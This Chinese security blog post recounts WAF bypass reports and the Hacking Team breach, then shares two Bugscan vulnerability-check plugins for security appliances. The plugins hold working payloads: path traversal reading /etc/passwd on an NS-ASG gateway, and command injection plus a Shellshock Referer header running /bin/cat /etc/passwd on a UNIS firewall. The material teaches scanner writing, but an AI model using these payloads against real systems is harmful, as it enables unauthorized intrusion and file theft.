01

讲个故事先

  

  

  

  

4月5号

乌云上有个白帽子提交了一个漏洞，标题相当霸气:《**绿盟、启明星辰、铱讯等厂商的 WAF 存在上传检测 bypass**》(小编因为强迫症，偷偷把原标题中的错别字改过来了)。

4月6号

流传出来了一张通报的图片，署名北京信息安全测评中心，通主要内容是关于绿盟、启明星辰、铱迅等三家厂商的WAF存在“上传监测Bypass漏洞”，要求各委办局排查并防范。

4月22号

绿盟、启明星辰、铱讯三家厂商分别给出了回应，至于怎么回应的，其实你可以自己去看看喽。值得一提的是，在铱讯回应里面，对该漏洞提出了质疑，怀疑是“某华东厂商”。大家都在想这个某华东厂商是谁的时候，安恒发布了一条《郑重声明》，撇开与这个事的关系啦。

好了，国内的这个小故事就说到这了。再说说国外的。

  

  

![](../Images/8fc3e2d0f0248d16a7ea6772541dd5eb.png "http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160425-1461584457631086905.jpg")  还记得去年7月让安全圈炸了的 Hacking Team 被黑事件不？最近大黑阔 Phineas Fisher 在 PasteBin 上公开了入侵 Hacking Team 服务器的细节。国内的译文早都出来了，我相信你也看过了，你要是没看过，你一会去搜一下嘛。  
  
值得讨论的，是 FinFisher 撕开内网口子的方法：FinFisher 是将一个未披露名字的企业网络使用的**嵌入式设备** 0day 漏洞作为入口，渗透进 Hacking Team 的内网。他为有漏洞的嵌入式设备开发和安装了一个后门固件，然后监听内网流量，扫描和绘制内网地图。  
  
而这些个嵌入式设备一般都是什么路由器呀，防火墙呀，安全网关什么的。这种感觉是不是有点像防盗门不防盗？

“说正事，这玩意儿和 WAF 有毛关系。”“客官，给我一首歌的时间，听我扯完。”

  

  

其实这些个防火墙，安全网关，再加上一开始提到的 WAF，都是安全加固当中不可或缺的部分。有个比较有趣的事情是，有些管理员给自己的应用补丁打的相当勤快，而对这些“安全”设备却不是那么在意，不知道是忘记了，还是相信安全设备就很安全呢？

安防产品漏洞扫描插件

  

![](../Images/acb44bd183bf9459d97e2dd81fae09d3.png "http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160425-1461585018391049518.jpg")   我靠，一不小心本性暴露了。  
  
  
   来自漏洞插件社区的白帽黑阔们响应速度是一等一的快，贡献了一堆的安防产品扫描插件。想知道你自己使用的安全防护产品有没有漏洞？扫一扫就知道啦。小编刚拿到驾照就载了一车的插件过来，无奈老大不让超载，今天分享的同时，顺便和客官们分享一下编写插件的思路（免费的！不收钱！）。  
  

  

![](../Images/f29a82feb1d4fc65dba47418e92421a6.png) 01 第一发：网康 NS-ASG 应用安全网关任意文件下载  
  
插件作者： yichin  
  

贡献级别：核心

插件代码 

#!usr/bin/env python

\# \*-\* coding:utf-8 \*-\*

  

'''

name: NS-ASG Arbitrarily File Download

author: yichin

refer: http://www.wooyun.org/bugs/wooyun-2014-058932

refer: http://www.wooyun.org/bugs/wooyun-2015-097832

'''

  

  

def assign(service, arg):

    if service \== 'ns-asg':

        return True, arg

  

def audit(arg):

    payloads \= \[

        arg + 'admin/cert\_download.php?file=acdefghijk&certfile=certs/../../../../../../../../etc/passwd',

        arg + 'commonplugin/Download.php?reqfile=../../../../../etc/passwd',

    \]

    for payload in payloads:

        # 发送请求

        code, head, res, err, \_ \= curl.curl2(payload)

        ＃ 判断回显

        if (code\==200) and ('root:' in res):

            security\_hole('Arbitrarily file download: ' + payload)

  

if \_\_name\_\_ \== '\_\_main\_\_':

    from dummy import \*

    audit(assign('ns-asg','http://www.example.com/')\[1\])

  

  

  

  

 小编快评 ![](../Images/83c9ab27818ab3ed470cf0f6ec962b2a.png)  这个插件对应的漏洞是《网康 NS-ASG 应用安全网关任意文件下载漏洞》，任意文件下载漏洞编写起来也是灰常灰常容易啦。任意文件下载是有两处下载点的，admin/cert\_download.php 和 commonplugin/Download.php， 作者将这两个下载点和对应的 Payload 全部放置进了一个 list 里，逐个访问目标地址，然后看返回的页面里面有没有要下载的文件内容。比如这里我们下载的文件是 /etc/passwd 文件，这个文件里面肯定保存着 root 这个账号，所以就检测是不是有这个字符就可以啦。  
  
![](../Images/3725be60a3fb9072b63c635d0808ed86.png "http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160425-1461586029047041956.png")   这里值得注意的是，如果批量全网扫的时候，这样写的肯定是会存在误报的，但是 Bugscan  框架本身会对目标进行指纹验证，看到 assign 函数那里的 ns-asg 了吗？对就是这个，极大程度上把误报率降了下来。吼吼吼，套路，都是套路。

![](../Images/f29a82feb1d4fc65dba47418e92421a6.png) 02 第二发：清华紫光硬件网关防火墙UF3504 3.0版型号命令执行2处

插件代码

#!/usr/bin/env python

\# -\*- coding: utf-8 -\*-

\# ref: http://www.wooyun.org/bugs/wooyun-2010-0114593

  

import urlparse

  

  

def assign(service, arg):

    if service \== "unis\_gateway":

        arr \= urlparse.urlparse(arg)

        return True, '%s://%s/' % (arr.scheme, arr.netloc)

  

def audit(arg):

    \# 第一处命令执行检测

    url \= arg + 'cgi-bin/UserManager'

    postdata \= "login=%b5%c7%c2%bc&action=useraction&passwd=123456&username=%22set%7cset%26set%22"

    code, head, res, errcode, \_ \= curl.curl2(url, *post*\=postdata)

    if code\==200 and 'DOCUMENT\_ROOT' in res:

        security\_hole("清华紫光硬件防火墙UF3504 3.0版型号命令执行:http://www.wooyun.org/bugs/wooyun-2010-0115756")

    \# 第二处命令执行检测

    code, head, res, errcode, \_ \= curl.curl2(arg, *referer*\='() { :;}; echo  \`/bin/cat /etc/passwd\`')

    if code\==200 and 'root' in head:

       security\_hole("清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  \`/bin/cat /etc/passwd\`")

  

if \_\_name\_\_ \== '\_\_main\_\_':

    from dummy import \*

    audit(assign('unis\_gateway','http://www.example.com/')\[1\])

  

 小编快评 ![](../Images/83c9ab27818ab3ed470cf0f6ec962b2a.png)![](../Images/379f4ae893b3731557072b6220c3db13.png "http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160425-1461586676304086554.jpg")   这个插件是 boy 大表哥在双蛋活动中与 yichin 大黑阔大战时的产物。该插件同时检测了两处命令执行漏洞，第一处是 cgi-bin/UserManager 处的漏洞，第二处是 Bash 破壳漏洞。  
  

我们先看第一处，从详情处得到了目标 URL 地址，和要通过 POST 方式发送的 Payload, 调用我们框架中的 curl2 方法发送 HTTP 报文，这里的 Payload 执行的命令是 set|set&set 其实就是输出显示环境变量，那我们就从环境变量里面找到一个通用的字符串呗。作者选择了 DOCUMENT\_ROOT 这个字符串。

  
再来看第二处的破壳漏洞，把 HTTP 头部的 Referer 字段值改成 Payload，通过 curl2 发送到服务器。
